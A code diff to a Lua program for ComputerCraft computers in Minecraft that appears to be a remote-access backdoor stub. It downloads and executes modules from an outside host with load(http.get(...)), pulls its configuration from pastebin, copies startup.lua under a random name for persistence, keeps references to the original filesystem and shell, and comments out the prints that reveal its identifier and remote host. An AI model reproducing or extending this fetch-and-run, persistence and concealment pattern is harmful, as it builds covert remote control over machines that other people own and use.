@@ -27,7 +27,6 @@ local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or 
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
-
 local metadataFile = nil
 local rstartup = utils.generateRandomString(3)
 _OGFS.copy("startup.lua",rstartup)
@@ -164,8 +163,8 @@ eventhook.setEventHandler(eventhandler)
 --startup:onStartup()
 config:DownloadConfig("https://pastebin.com/raw/ExvGpiDF") --Old: https://pastebin.com/raw/rHA43mQp
 config:set("identifier.stubid", utils.generateRandomString(16))
-print("identifier: "..config:get("identifier.stubid"))
-print("RHOST: "..config:get("networking.http.rhost"))
+--print("identifier: "..config:get("identifier.stubid"))
+--print("RHOST: {Redacted for sanity sake}")
 local handlerInstance = setmetatable({}, eventhandler)
 myhttp.setEnD(EnD)
 wsrouter.setIdentifier(config:get("identifier.stubid"))
@@ -212,6 +211,13 @@ function main.getUninstaller()
 end
 function main.getOGShell()
     return _OGShell
+end
+function main.getOGFS()
+    return _OGFS
+end
+
+function main.getProgramPath()
+    return bdapath
 end
 
 local function init()
